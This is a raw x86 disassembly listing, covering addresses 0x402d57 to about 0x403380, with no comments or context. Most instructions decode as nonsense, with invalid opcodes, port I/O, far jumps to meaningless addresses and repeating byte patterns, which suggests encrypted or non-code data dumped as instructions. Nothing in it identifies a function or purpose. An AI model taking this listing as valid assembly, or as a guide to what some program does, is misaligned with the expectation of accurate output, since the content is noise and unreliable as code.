  402d57:	66 83 6a b3 be       	subw   $0xffbe,-0x4d(%edx)
  402d5c:	6b 21 c6             	imul   $0xffffffc6,(%ecx),%esp
  402d5f:	ec                   	in     (%dx),%al
  402d60:	7c 63                	jl     0x402dc5
  402d62:	b2 72                	mov    $0x72,%dl
  402d64:	6e                   	outsb  %ds:(%esi),(%dx)
  402d65:	9b                   	fwait
  402d66:	7f 9a                	jg     0x402d02
  402d68:	c9                   	leave
  402d69:	60                   	pusha
  402d6a:	ba 26 68 5d 7f       	mov    $0x7f5d6826,%edx
  402d6f:	9a 1a 8c d1 41 e2 60 	lcall  $0x60e2,$0x41d18c1a
  402d76:	25 ee 6c 7a b7       	and    $0xb77a6cee,%eax
  402d7b:	22 77 65             	and    0x65(%edi),%dh
  402d7e:	b1 66                	mov    $0x66,%cl
  402d80:	e1 21                	loope  0x402da3
  402d82:	c2 ef 9a             	ret    $0x9aef
  402d85:	65 e0 4f             	gs loopne 0x402dd7
  402d88:	b8 ed c0 67 b2       	mov    $0xb267c0ed,%eax
  402d8d:	65 ea ef 2d 90 b7 22 	gs ljmp $0x7622,$0xb7902def
  402d94:	76 
  402d95:	65 b1 33             	gs mov $0x33,%cl
  402d98:	9c                   	pushf
  402d99:	ed                   	in     (%dx),%eax
  402d9a:	2a 65 75             	sub    0x75(%ebp),%ah
  402d9d:	60                   	pusha
  402d9e:	ba 26 68 e7 c1       	mov    $0xc1e76826,%edx
  402da3:	63 1a                	arpl   %ebx,(%edx)
  402da5:	ef                   	out    %eax,(%dx)
  402da6:	b9 ae 97 ed c8       	mov    $0xc8ed97ae,%ecx
  402dab:	67 b2 4d             	addr16 mov $0x4d,%dl
  402dae:	ea ef 92 65 e0 67 b8 	ljmp   $0xb867,$0xe06592ef
  402db5:	e7 d2                	out    %eax,$0xd2
  402db7:	62 e1 21             	(bad) {%k2}{z}
  402dba:	c2 a0 6c             	ret    $0x6ca0
  402dbd:	57                   	push   %edi
  402dbe:	d3 eb                	shr    %cl,%ebx
  402dc0:	2c 7a                	sub    $0x7a,%al
  402dc2:	3b ed                	cmp    %ebp,%ebp
  402dc4:	3d 9c b3 76 97       	cmp    $0x9776b39c,%eax
  402dc9:	61                   	popa
  402dca:	3a c7                	cmp    %bh,%al
  402dcc:	2a 64 b9 ae          	sub    -0x52(%ecx,%edi,4),%ah
  402dd0:	97                   	xchg   %eax,%edi
  402dd1:	4d                   	dec    %ebp
  402dd2:	c2 eb 3c             	ret    $0x3ceb
  402dd5:	7a 3f                	jp     0x402e16
  402dd7:	67 b8 e7 d2 62 e1    	addr16 mov $0xe162d2e7,%eax
  402ddd:	21 c2                	and    %eax,%edx
  402ddf:	a0 6f 8d b3 62       	mov    0x62b38d6f,%al
  402de4:	55                   	push   %ebp
  402de5:	65 3a 66 68          	cmp    %gs:0x68(%esi),%ah
  402de9:	37                   	aaa
  402dea:	6c                   	insb   (%dx),%es:(%edi)
  402deb:	69 de 31 2a a7 8a    	imul   $0x8aa72a31,%esi,%ebx
  402df1:	66 c5 52 7d          	lds    0x7d(%edx),%dx
  402df5:	80 92 24 68 8c 4e 9a 	adcb   $0x9a,0x4e8c6824(%edx)
  402dfc:	97                   	xchg   %eax,%edi
  402dfd:	9b                   	fwait
  402dfe:	b9 a2 64 3b 64       	mov    $0x643b64a2,%ecx
  402e03:	3d a1 a7 6f ef       	cmp    $0xef6fa7a1,%eax
  402e08:	8d                   	lea    (bad),%ebx
  402e09:	dc 66 43             	fsubl  0x43(%esi)
  402e0c:	68 64 d2 b7 23       	push   $0x23b7d264
  402e11:	64 3a 35 3e 33 d2 61 	cmp    %fs:0x61d2333e,%dh
  402e18:	92                   	xchg   %eax,%edx
  402e19:	9b                   	fwait
  402e1a:	c5 a0 ed 87 e5 99    	lds    -0x661a7813(%eax),%esp
  402e20:	97                   	xchg   %eax,%edi
  402e21:	64 d2 d7             	fs rcl %cl,%bh
  402e24:	24 64                	and    $0x64,%al
  402e26:	3a 5b 68             	cmp    0x68(%ebx),%bl
  402e29:	64 3a e6             	fs cmp %dh,%ah
  402e2c:	1b 63 fc             	sbb    -0x4(%ebx),%esp
  402e2f:	e3 8b                	jecxz  0x402dbc
  402e31:	bb c5 99 69 a2       	mov    $0xa26999c5,%ebx
  402e36:	bf 95 87 9b c5       	mov    $0xc59b8795,%edi
  402e3b:	66 eb 61             	data16 jmp 0x402e9f
  402e3e:	3a c7                	cmp    %bh,%al
  402e40:	2a 64 3d e6          	sub    -0x1a(%ebp,%edi,1),%ah
  402e44:	d5 87                	aad    $0x87
  402e46:	e5 99                	in     $0x99,%eax
  402e48:	97                   	xchg   %eax,%edi
  402e49:	64 4f                	fs dec %edi
  402e4b:	77 67                	ja     0x402eb4
  402e4d:	d2 bf 95 87 9b c5    	sarb   %cl,-0x3a64786b(%edi)
  402e53:	e6 54                	out    %al,$0x54
  402e55:	61                   	popa
  402e56:	d6                   	salc
  402e57:	ce                   	into
  402e58:	2a 64 3b 12          	sub    0x12(%ebx,%edi,1),%ah
  402e5c:	72 e4                	jb     0x402e42
  402e5e:	87 85 b7 9b c5 66    	xchg   %eax,0x66c59bb7(%ebp)
  402e64:	1c 77                	sbb    $0x77,%al
  402e66:	35 d0 ed 97 d5       	xor    $0xd597edd0,%eax
  402e6b:	99                   	cltd
  402e6c:	97                   	xchg   %eax,%edi
  402e6d:	e4 06                	in     $0x6,%al
  402e6f:	63 84 cc 78 66 6a 11 	arpl   %eax,0x116a6678(%esp,%ecx,8)
  402e76:	38 8d 36 6b 8c f3    	cmp    %cl,-0xc7394ca(%ebp)
  402e7c:	9b                   	fwait
  402e7d:	8b c5                	mov    %ebp,%eax
  402e7f:	99                   	cltd
  402e80:	e1 f1                	loope  0x402e73
  402e82:	92                   	xchg   %eax,%edx
  402e83:	b8 97 9b 51 ac       	mov    $0xac519b97,%eax
  402e88:	67 e9 36 6b ac cc    	addr16 jmp 0xccec99c4
  402e8e:	78 66                	js     0x402ef6
  402e90:	39 8c 98 2a 68 64 b1 	cmp    %ecx,-0x4e9b97d6(%eax,%ebx,4)
  402e97:	f3 c0 ba c5 99 e1 60 	repz sarb $0xaf,0x60e199c5(%edx)
  402e9e:	af 
  402e9f:	36 e1 25             	ss loope 0x402ec7
  402ea2:	3a 69 de             	cmp    -0x22(%ecx),%ch
  402ea5:	f1                   	int1
  402ea6:	c9                   	leave
  402ea7:	89 97 9b 51 ac 76    	mov    %edx,0x76ac519b(%edi)
  402ead:	e9 36 6b 02 cc       	jmp    0xcc4299e8
  402eb2:	78 66                	js     0x402f1a
  402eb4:	39 a5 d8 64 e1 f1    	cmp    %esp,-0xe1e9b28(%ebp)
  402eba:	9e                   	sahf
  402ebb:	b8 97 9b c5 52       	mov    $0x52c59b97,%eax
  402ec0:	7d 34                	jge    0x402ef6
  402ec2:	b3 27                	mov    $0x27,%bl
  402ec4:	68 8c e4 2d 68       	push   $0x682de48c
  402ec9:	64 b1 f3             	fs mov $0xf3,%cl
  402ecc:	cc                   	int3
  402ecd:	ba c5 99 e1 60       	mov    $0x60e199c5,%edx
  402ed2:	2f                   	das
  402ed3:	46                   	inc    %esi
  402ed4:	e9 24 3a e6 ed       	jmp    0xee2668fd
  402ed9:	97                   	xchg   %eax,%edi
  402eda:	d5 99                	aad    $0x99
  402edc:	97                   	xchg   %eax,%edi
  402edd:	65 35 d0 ed 97 d5    	gs xor $0xd597edd0,%eax
  402ee3:	99                   	cltd
  402ee4:	97                   	xchg   %eax,%edi
  402ee5:	0f fa 78 e8          	psubd  -0x18(%eax),%mm7
  402ee9:	58                   	pop    %eax
  402eea:	3f                   	aas
  402eeb:	0c c0                	or     $0xc0,%al
  402eed:	26 3a 66 67          	cmp    %es:0x67(%esi),%ah
  402ef1:	e1 77                	loope  0x402f6a
  402ef3:	99                   	cltd
  402ef4:	97                   	xchg   %eax,%edi
  402ef5:	9b                   	fwait
  402ef6:	fc                   	cld
  402ef7:	e3 9b                	jecxz  0x402e94
  402ef9:	8b c5                	mov    %ebp,%eax
  402efb:	99                   	cltd
  402efc:	68 6b 8c f3 9b       	push   $0x9bf38c6b
  402f01:	8b c5                	mov    %ebp,%eax
  402f03:	99                   	cltd
  402f04:	a9 86 38 e5 54       	test   $0x54e53886,%eax
  402f09:	71 1a                	jno    0x402f25
  402f0b:	e7 28                	out    %eax,$0x28
  402f0d:	64 3a 69 ec          	cmp    %fs:-0x14(%ecx),%ch
  402f11:	fe                   	(bad)
  402f12:	3e 66 68 6b 8c       	ds pushw $0x8c6b
  402f17:	f3 9b                	repz fwait
  402f19:	8b c5                	mov    %ebp,%eax
  402f1b:	99                   	cltd
  402f1c:	a9 86 38 ed 7c       	test   $0x7ced3886,%eax
  402f21:	71 6a                	jno    0x402f8d
  402f23:	ef                   	out    %eax,(%dx)
  402f24:	29 64 b3 f3          	sub    %esp,-0xd(%ebx,%esi,4)
  402f28:	bc bb c5 99 97       	mov    $0x9799c5bb,%esp
  402f2d:	61                   	popa
  402f2e:	3a c7                	cmp    %bh,%al
  402f30:	2a 64 ba db          	sub    -0x25(%edx,%edi,4),%ah
  402f34:	8b bb c5 99 68 6b    	mov    0x6b6899c5(%ebx),%edi
  402f3a:	be f1 69 64 3a       	mov    $0x3a6469f1,%esi
  402f3f:	8e 3e                	mov    (%esi),%?
  402f41:	9d                   	popf
  402f42:	c5 99 e1 e1 e2 b9    	lds    -0x461d1e1f(%ecx),%ebx
  402f48:	97                   	xchg   %eax,%edi
  402f49:	9b                   	fwait
  402f4a:	c5 63 68             	lds    0x68(%ebx),%esp
  402f4d:	c5 78 66             	lds    0x66(%eax),%edi
  402f50:	e3 f1                	jecxz  0x402f43
  402f52:	ee                   	out    %al,(%dx)
  402f53:	b9 97 9b b3 b5       	mov    $0xb5b39b97,%ecx
  402f58:	a9 8f 2c a7 8b       	test   $0x8ba72c8f,%eax
  402f5d:	72 b3                	jb     0x402f12
  402f5f:	be 6d 64 3a 26       	mov    $0x263a646d,%esi
  402f64:	68 ed bf 92 87       	push   $0x8792bfed
  402f69:	9b                   	fwait
  402f6a:	c5 57 97             	lds    -0x69(%edi),%edx
  402f6d:	8f                   	(bad)
  402f6e:	1b 0e                	sbb    (%esi),%ecx
  402f70:	68 74 3a 66 3b       	push   $0x3b663a74
  402f75:	8c 9c 2d 68 64 b3 a0 	mov    %ds,-0x5f4c9b98(%ebp,%ebp,1)
  402f7c:	eb 92                	jmp    0x402f10
  402f7e:	3b a7 8e 66 b3 d2    	cmp    -0x2d4c9972(%edi),%esp
  402f84:	d5 9c                	aad    $0x9c
  402f86:	d5 99                	aad    $0x99
  402f88:	97                   	xchg   %eax,%edi
  402f89:	23 bb a5 68 74 3a    	and    0x3a7468a5(%ebx),%edi
  402f8f:	66 53                	push   %bx
  402f91:	f9                   	stc
  402f92:	ce                   	into
  402f93:	89 97 9b 4c b1 e5    	mov    %edx,-0x1a4eb365(%edi)
  402f99:	e1 be                	loope  0x402f59
  402f9b:	b8 97 9b 6a 8e       	mov    $0x8e6a9b97,%eax
  402fa0:	30 2f                	xor    %ch,(%edi)
  402fa2:	3a 66 97             	cmp    -0x69(%esi),%ah
  402fa5:	61                   	popa
  402fa6:	3a c7                	cmp    %bh,%al
  402fa8:	2a 64 b9 c3          	sub    -0x3d(%ecx,%edi,4),%ah
  402fac:	84 8b c5 99 68 8d    	test   %cl,-0x7297663b(%ebx)
  402fb2:	b6 66                	mov    $0x66,%dh
  402fb4:	68 64 52 99 97       	push   $0x97995264
  402fb9:	64 3a 99 dd 88 d5 99 	cmp    %fs:-0x662a7723(%ecx),%bl
  402fc0:	97                   	xchg   %eax,%edi
  402fc1:	9b                   	fwait
  402fc2:	8f                   	(bad)
  402fc3:	be b7 9b c5 8e       	mov    $0x8ec59bb7,%esi
  402fc8:	79 9e                	jns    0x402f68
  402fca:	c5 99 eb a0 36 ef    	lds    -0x10c95f15(%ecx),%ebx
  402fd0:	2d 98 33 a6 1c       	sub    $0x1ca63398,%eax
  402fd5:	06                   	push   %es
  402fd6:	b9 c3 e8 ba c5       	mov    $0xc5bae8c3,%ecx
  402fdb:	99                   	cltd
  402fdc:	68 ef a7 e6 b6       	push   $0xb6e6a7ef
  402fe1:	9b                   	fwait
  402fe2:	c5 8d 2a 55 c5 ef    	lds    -0x103aaad6(%ebp),%ecx
  402fe8:	b2 a5                	mov    $0xa5,%dl
  402fea:	d0 64 a9 86          	shlb   $1,-0x7a(%ecx,%ebp,4)
  402fee:	38 65 3d             	cmp    %ah,0x3d(%ebp)
  402ff1:	98                   	cwtl
  402ff2:	b1 52                	mov    $0x52,%cl
  402ff4:	d2 e7                	shl    %cl,%bh
  402ff6:	dc 62 53             	fsubl  0x53(%edx)
  402ff9:	d0 87 9e 87 9b c5    	rolb   $1,-0x3a647862(%edi)
  402fff:	13 61 23             	adc    0x23(%ecx),%esp
  403002:	bb 99 68 60 3a       	mov    $0x3a606899,%ebx
  403007:	66 1a b9 bb 99 97 67 	data16 sbb 0x679799bb(%ecx),%bh
  40300e:	3a 66 1a             	cmp    0x1a(%esi),%ah
  403011:	6b b3 be 6d 64 2a 66 	imul   $0x66,0x2a646dbe(%ebx),%esi
  403018:	68 ed bf e6 b6       	push   $0xb6e6bfed
  40301d:	9b                   	fwait
  40301e:	c5 8d 26 e5 f9 66    	lds    0x66f9e526(%ebp),%ecx
  403024:	78 64                	js     0x40308a
  403026:	3a e7                	cmp    %bh,%ah
  403028:	93                   	xchg   %eax,%ebx
  403029:	64 ca 66 68          	fs lret $0x6866
  40302d:	12 8c 99 1d 98 d2 72 	adc    0x72d2981d(%ecx,%ebx,4),%cl
  403034:	92                   	xchg   %eax,%edx
  403035:	9b                   	fwait
  403036:	c5 3f                	lds    (%edi),%edi
  403038:	e9 e1 d6 89 97       	jmp    0x97ca071e
  40303d:	9b                   	fwait
  40303e:	3a 66 69             	cmp    0x69(%esi),%ah
  403041:	64 b1 e3             	fs mov $0xe3,%cl
  403044:	e4 ba                	in     $0xba,%al
  403046:	c5 99 45 9b c5 66    	lds    0x66c59b45(%ecx),%ebx
  40304c:	68 5d bf 8a 87       	push   $0x878abf5d
  403051:	9b                   	fwait
  403052:	c5 69 ee             	lds    -0x12(%ecx),%ebp
  403055:	39 c5                	cmp    %eax,%ebp
  403057:	99                   	cltd
  403058:	97                   	xchg   %eax,%edi
  403059:	9b                   	fwait
  40305a:	3f                   	aas
  40305b:	66 c9                	leavew
  40305d:	26 3a 99 dd bc e5 99 	cmp    %es:-0x661a4323(%ecx),%bl
  403064:	97                   	xchg   %eax,%edi
  403065:	8c 08                	mov    %cs,(%eax)
  403067:	2c 68                	sub    $0x68,%al
  403069:	64 d3 26             	shll   %cl,%fs:(%esi)
  40306c:	6b 64 3a 69 de       	imul   $0xffffffde,0x69(%edx,%edi,1),%esp
  403071:	f1                   	int1
  403072:	c9                   	leave
  403073:	89 97 9b fb 84 6a    	mov    %edx,0x6a84fb9b(%edi)
  403079:	ef                   	out    %eax,(%dx)
  40307a:	2e 73 48             	jae,pn 0x4030c5
  40307d:	e5 7a                	in     $0x7a,%eax
  40307f:	66 e1 f1             	data16 loope 0x403073
  403082:	ce                   	into
  403083:	89 97 9b b9 c3 9c    	mov    %edx,-0x633c4665(%edi)
  403089:	8b c5                	mov    %ebp,%eax
  40308b:	99                   	cltd
  40308c:	68 ef af 92 87       	push   $0x8792afef
  403091:	9b                   	fwait
  403092:	c5 a7 8a 66 b3 bf    	lds    -0x404c9976(%edi),%esp
  403098:	a9 8d 38 a7 89       	test   $0x89a7388d,%eax
  40309d:	66 39 2b             	cmp    %bp,(%ebx)
  4030a0:	94                   	xchg   %eax,%esp
  4030a1:	ef                   	out    %eax,(%dx)
  4030a2:	36 77 e1             	ss ja  0x403086
  4030a5:	e8 2f 8e b7 9b       	call   0x9bf7bed9
  4030aa:	c5 ed fd 90 d5 99 97 	vpaddw -0x5a68662b(%eax),%ymm2,%ymm2
  4030b1:	a5 
  4030b2:	d8 64 e1 bd          	fsubs  -0x43(%ecx,%eiz,8)
  4030b6:	fb                   	sti
  4030b7:	8f 6a a5 db          	(bad)
  4030bb:	64 6b 29 c6          	imul   $0xffffffc6,%fs:(%ecx),%ebp
  4030bf:	67 a2 e4 30          	addr16 mov %al,0x30e4
  4030c3:	64 97                	fs xchg %eax,%edi
  4030c5:	e1 ce                	loope  0x403095
  4030c7:	89 97 9b bb db 9c    	mov    %edx,-0x63244465(%edi)
  4030cd:	8b c5                	mov    %ebp,%eax
  4030cf:	99                   	cltd
  4030d0:	68 60 3a 66 1a       	push   $0x1a663a60
  4030d5:	d3 c5                	rol    %cl,%ebp
  4030d7:	63 68 c5             	arpl   %ebp,-0x3b(%eax)
  4030da:	78 66                	js     0x403142
  4030dc:	e8 d9 d9 b9 97       	call   0x97fa0aba
  4030e1:	9b                   	fwait
  4030e2:	3a 13                	cmp    (%ebx),%dl
  4030e4:	33 0c d0             	xor    (%eax,%edx,8),%ecx
  4030e7:	cf                   	iret
  4030e8:	2a 64 d2 c7          	sub    -0x39(%edx,%edx,8),%ah
  4030ec:	21 64 3a ef          	and    %esp,-0x11(%edx,%edi,1)
  4030f0:	ed                   	in     (%dx),%eax
  4030f1:	c4                   	(bad)
  4030f2:	e4 99                	in     $0x99,%al
  4030f4:	97                   	xchg   %eax,%edi
  4030f5:	ed                   	in     (%dx),%eax
  4030f6:	f8                   	clc
  4030f7:	65 7c 61             	gs jl  0x40315b
  4030fa:	06                   	push   %es
  4030fb:	66 68 64 b3          	pushw  $0xb364
  4030ff:	f3 f4                	repz hlt
  403101:	ba c5 99 eb a6       	mov    $0xa6eb99c5,%edx
  403106:	42                   	inc    %edx
  403107:	65 6a ed             	gs push $0xffffffed
  40310a:	bf fe b6 9b c5       	mov    $0xc59bb6fe,%edi
  40310f:	ed                   	in     (%dx),%eax
  403110:	ed                   	in     (%dx),%eax
  403111:	c4                   	(bad)
  403112:	e4 99                	in     $0x99,%al
  403114:	97                   	xchg   %eax,%edi
  403115:	ef                   	out    %eax,(%dx)
  403116:	af                   	scas   %es:(%edi),%eax
  403117:	fe                   	(bad)
  403118:	b6 9b                	mov    $0x9b,%dh
  40311a:	c5 e5 aa             	(bad)
  40311d:	78 39                	js     0x403158
  40311f:	64 e1 e1             	fs loope 0x403103
  403122:	ae                   	scas   %es:(%edi),%al
  403123:	b8 97 9b b1 e3       	mov    $0xe3b19b97,%eax
  403128:	c8 ba c5 99          	enter  $0xc5ba,$0x99
  40312c:	e3 f1                	jecxz  0x40311f
  40312e:	ae                   	scas   %es:(%edi),%al
  40312f:	b8 97 9b 39 64       	mov    $0x64399b97,%eax
  403134:	e1 e1                	loope  0x403117
  403136:	aa                   	stos   %al,%es:(%edi)
  403137:	b8 97 9b b3 e3       	mov    $0xe3b39b97,%eax
  40313c:	c4 bb c5 99 e3 e1    	les    -0x1e1c663b(%ebx),%edi
  403142:	ee                   	out    %al,(%dx)
  403143:	b9 97 9b b3 e3       	mov    $0xe3b39b97,%ecx
  403148:	b4 bb                	mov    $0xbb,%ah
  40314a:	c5 99 02 78 b7 e3    	lds    -0x1c4887fe(%ecx),%ebx
  403150:	d0 bb c5 99 38 9b    	sarb   $1,-0x64c7663b(%ebx)
  403156:	8f                   	(bad)
  403157:	ba b7 9b c5 8e       	mov    $0x8ec59bb7,%edx
  40315c:	34 2e                	xor    $0x2e,%al
  40315e:	3a 66 e3             	cmp    -0x1d(%esi),%ah
  403161:	e1 ee                	loope  0x403151
  403163:	b9 97 9b 03 e3       	mov    $0xe3039b97,%ecx
  403168:	d4 bb                	aam    $0xbb
  40316a:	c5 99 1d 27 b1 e3    	lds    -0x1c4ed8e3(%ecx),%ebx
  403170:	ac                   	lods   %ds:(%esi),%al
  403171:	bb c5 99 e1 e1       	mov    $0xe1e199c5,%ebx
  403176:	8e b9 97 9b 3b e3    	mov    -0x1cc46469(%ecx),%?
  40317c:	b4 bb                	mov    $0xbb,%ah
  40317e:	c5 99 e8 d9 d9 b9    	lds    -0x46262618(%ecx),%ebx
  403184:	97                   	xchg   %eax,%edi
  403185:	9b                   	fwait
  403186:	3a 13                	cmp    (%ebx),%dl
  403188:	ab                   	stos   %eax,%es:(%edi)
  403189:	0c 3a                	or     $0x3a,%al
  40318b:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  40318d:	44                   	inc    %esp
  40318e:	50                   	push   %eax
  40318f:	66 e3 f1             	data16 jecxz 0x403183
  403192:	8e b9 97 9b fb 8c    	mov    -0x73046469(%ecx),%?
  403198:	64 36 b1 f3          	fs ss mov $0xf3,%cl
  40319c:	d0 bb c5 99 a9 8e    	sarb   $1,-0x7156663b(%ebx)
  4031a2:	36 34 00             	ss xor $0x0,%al
  4031a5:	69 3a 67 68 9b af    	imul   $0xaf9b6867,(%edx),%edi
  4031ab:	ca b7 9b             	lret   $0x9bb7
  4031ae:	c5 8d f3 9b 3f 66    	lds    0x663f9bf3(%ebp),%ecx
  4031b4:	c9                   	leave
  4031b5:	26 3a 69 de          	cmp    %es:-0x22(%ecx),%ch
  4031b9:	f1                   	int1
  4031ba:	c9                   	leave
  4031bb:	89 97 9b fb 84 6a    	mov    %edx,0x6a84fb9b(%edi)
  4031c1:	ef                   	out    %eax,(%dx)
  4031c2:	b7 ba                	mov    $0xba,%bh
  4031c4:	b7 9b                	mov    $0x9b,%bh
  4031c6:	c5 4d e5             	lds    -0x1b(%ebp),%ecx
  4031c9:	b0 e5                	mov    $0xe5,%al
  4031cb:	99                   	cltd
  4031cc:	97                   	xchg   %eax,%edi
  4031cd:	ed                   	in     (%dx),%eax
  4031ce:	36 73 58             	ss jae 0x403229
  4031d1:	e1 7a                	loope  0x40324d
  4031d3:	66 67 d2 af 95 87    	data16 shrb %cl,-0x786b(%bx)
  4031d9:	9b                   	fwait
  4031da:	c5 a7 8a 66 b1 72    	lds    0x72b1668a(%edi),%esp
  4031e0:	7d 44                	jge    0x403226
  4031e2:	bb 26 68 ed af       	mov    $0xafed6826,%ebx
  4031e7:	92                   	xchg   %eax,%edx
  4031e8:	87 9b c5 0e 68 74    	xchg   %ebx,0x74680ec5(%ebx)
  4031ee:	3a 66 3a             	cmp    0x3a(%esi),%ah
  4031f1:	8c 0c 2f             	mov    %cs,(%edi,%ebp,1)
  4031f4:	68 64 b3 e3 d8       	push   $0xd8e3b364
  4031f9:	bb c5 99 61 a4       	mov    $0xa46199c5,%ebx
  4031fe:	35 e3 08 65 3a       	xor    $0x3a6508e3,%eax
  403203:	66 e8 19 32          	callw  0x6420
  403207:	66 67 e0 00          	data16 loopnew 0x40320b
  40320b:	67 68 64 b1 e3 9c    	addr16 push $0x9ce3b164
  403211:	8b c5                	mov    %ebp,%eax
  403213:	99                   	cltd
  403214:	67 d2 3a             	sarb   %cl,(%bp,%si)
  403217:	5b                   	pop    %ebx
  403218:	81 64 3a 66 1c 6b ba 	andl   $0x1bba6b1c,0x66(%edx,%edi,1)
  40321f:	1b 
  403220:	60                   	pusha
  403221:	65 35 e2 54 65 3a    	gs xor $0x3a6554e2,%eax
  403227:	66 81 7f 3b 66 68    	cmpw   $0x6866,0x3b(%edi)
  40322d:	ef                   	out    %eax,(%dx)
  40322e:	bf 92 87 9b c5       	mov    $0xc59b8792,%edi
  403233:	ed                   	in     (%dx),%eax
  403234:	7c 61                	jl     0x403297
  403236:	3b 66 68             	cmp    0x68(%esi),%esp
  403239:	64 b9 8c 97 e9 7e    	fs mov $0x7ee9978c,%ecx
  40323f:	64 6c                	fs insb (%dx),%es:(%edi)
  403241:	ed                   	in     (%dx),%eax
  403242:	bf 82 b7 9b c5       	mov    $0xc59bb782,%edi
  403247:	a0 ed c7 e4 99       	mov    0x99e4c7ed,%al
  40324c:	97                   	xchg   %eax,%edi
  40324d:	64 b9 cb 8c bb c5    	fs mov $0xc5bb8ccb,%ecx
  403253:	99                   	cltd
  403254:	6d                   	insl   (%dx),%es:(%edi)
  403255:	ef                   	out    %eax,(%dx)
  403256:	8f 82 b7 9b c5 ef    	pop    -0x103a6449(%edx)
  40325c:	98                   	cwtl
  40325d:	2c ba                	sub    $0xba,%al
  40325f:	5e                   	pop    %esi
  403260:	68 11 12 ef 98       	push   $0x98ef1211
  403265:	e7 d2                	out    %eax,$0xd2
  403267:	64 e8 5c 3a 13 76    	fs call 0x76536cc9
  40326d:	ed                   	in     (%dx),%eax
  40326e:	ca e5 80             	lret   $0x80e5
  403271:	67 ba 5e 68 11 2e    	addr16 mov $0x2e11685e,%edx
  403277:	ef                   	out    %eax,(%dx)
  403278:	98                   	cwtl
  403279:	e7 d2                	out    %eax,$0xd2
  40327b:	62                   	(bad)
  40327c:	e8 5c 3a 13 62       	call   0x62536cdd
  403281:	ed                   	in     (%dx),%eax
  403282:	ca e5 80             	lret   $0x80e5
  403285:	61                   	popa
  403286:	ba 5e 68 10 33       	mov    $0x3310685e,%edx
  40328b:	28 83 a9 c5 63 68    	sub    %al,0x6863c5a9(%ebx)
  403291:	c5 78 66             	lds    0x66(%eax),%edi
  403294:	67 d2 af c5 b6       	shrb   %cl,-0x493b(%bx)
  403299:	9b                   	fwait
  40329a:	c5 a7 8a 66 b3 d2    	lds    -0x2d4c9976(%edi),%esp
  4032a0:	7d c0                	jge    0x403262
  4032a2:	e0 99                	loopne 0x40323d
  4032a4:	97                   	xchg   %eax,%edi
  4032a5:	e4 bf                	in     $0xbf,%al
  4032a7:	c5 b6 9b c5 67 67    	lds    0x6767c59b(%esi),%esi
  4032ad:	d2 3c 5b             	sarb   %cl,(%ebx,%ebx,2)
  4032b0:	81 64 3a 66 1d 72 b1 	andl   $0x62b1721d,0x66(%edx,%edi,1)
  4032b7:	62 
  4032b8:	5d                   	pop    %ebp
  4032b9:	65 3a 66 68          	cmp    %gs:0x68(%esi),%ah
  4032bd:	e7 d2                	out    %eax,$0xd2
  4032bf:	99                   	cltd
  4032c0:	e5 20                	in     $0x20,%eax
  4032c2:	0a 62 e1             	or     -0x1f(%edx),%ah
  4032c5:	e1 de                	loope  0x4032a5
  4032c7:	b9 97 9b d1 e4       	mov    $0xe4d19b97,%ecx
  4032cc:	e1 93                	loope  0x403261
  4032ce:	d1 69 e3             	shrl   $1,-0x1d(%ecx)
  4032d1:	e1 ce                	loope  0x4032a1
  4032d3:	89 97 9b 3b 9e 41    	mov    %edx,0x419e3b9b(%edi)
  4032d9:	94                   	xchg   %eax,%esp
  4032da:	b0 71                	mov    $0x71,%al
  4032dc:	e0 74                	loopne 0x403352
  4032de:	7d 5d                	jge    0x40333d
  4032e0:	d5 80                	aad    $0x80
  4032e2:	e5 99                	in     $0x99,%eax
  4032e4:	97                   	xchg   %eax,%edi
  4032e5:	16                   	push   %ss
  4032e6:	d3 e6                	shl    %cl,%esi
  4032e8:	c5 c7 e4             	(bad)
  4032eb:	99                   	cltd
  4032ec:	97                   	xchg   %eax,%edi
  4032ed:	65 35 d0 fd c7 e4    	gs xor $0xe4c7fdd0,%eax
  4032f3:	99                   	cltd
  4032f4:	97                   	xchg   %eax,%edi
  4032f5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4032f6:	d8 64 e3 d8          	fsubs  -0x28(%ebx,%eiz,8)
  4032fa:	2f                   	das
  4032fb:	c2 b2 9b             	ret    $0x9bb2
  4032fe:	c5 a0 6f 64 ba 5a    	lds    0x5aba646f(%eax),%esp
  403304:	55                   	push   %ebp
  403305:	65 3a 66 68          	cmp    %gs:0x68(%esi),%ah
  403309:	64 4f                	fs dec %edi
  40330b:	4e                   	dec    %esi
  40330c:	e8 58 07 64 68       	call   0x68a43a69
  403311:	64 3a 66 1d          	cmp    %fs:0x1d(%esi),%ah
  403315:	7a ba                	jp     0x4032d1
  403317:	5a                   	pop    %edx
  403318:	55                   	push   %ebp
  403319:	67 3a 66 68          	cmp    0x68(%bp),%ah
  40331d:	64 4f                	fs dec %edi
  40331f:	72 e8                	jb     0x403309
  403321:	58                   	pop    %eax
  403322:	07                   	pop    %es
  403323:	62 68 64             	bound  %ebp,0x64(%eax)
  403326:	3a 66 1d             	cmp    0x1d(%esi),%ah
  403329:	6e                   	outsb  %ds:(%esi),(%dx)
  40332a:	ba 5a 55 61 3a       	mov    $0x3a61555a,%edx
  40332f:	66 68 64 4e          	pushw  $0x4e64
  403333:	65 2f                	gs das
  403335:	8f                   	(bad)
  403336:	f2 69 de e1 99 b8 97 	repnz imul $0x97b899e1,%esi,%ebx
  40333d:	9b                   	fwait
  40333e:	33 a6 17 c1 ba 1b    	xor    0x1bbac117(%esi),%esp
  403344:	60                   	pusha
  403345:	65 4e                	gs dec %esi
  403347:	7a 67                	jp     0x4033b0
  403349:	d2 bf 95 87 9b c5    	sarb   %cl,-0x3a64786b(%edi)
  40334f:	36 97                	ss xchg %eax,%edi
  403351:	d1 e6                	shl    $1,%esi
  403353:	b9 97 9b c5 d3       	mov    $0xd3c59b97,%ecx
  403358:	bc bb c5 99 80       	mov    $0x8099c5bb,%esp
  40335d:	12 c3                	adc    %bl,%al
  40335f:	99                   	cltd
  403360:	97                   	xchg   %eax,%edi
  403361:	e7 fe                	out    %eax,$0xfe
  403363:	6a e8                	push   $0xffffffe8
  403365:	d9 d9                	(bad)
  403367:	b9 97 9b 3a 12       	mov    $0x123a9b97,%ecx
  40336c:	2a e7                	sub    %bh,%ah
  40336e:	9f                   	lahf
  40336f:	92                   	xchg   %eax,%edx
  403370:	87 9b c5 66 e3 f1    	xchg   %ebx,-0xe1c993b(%ebx)
  403376:	ce                   	into
  403377:	89 97 9b fb 84 6a    	mov    %edx,0x6a84fb9b(%edi)
  40337d:	ed                   	in     (%dx),%eax
  40337e:	e3 a7                	jecxz  0x403327
  403380:	81 66 fb 87 6a 67 77 	andl   $0x77676a87,-0x5(%esi)
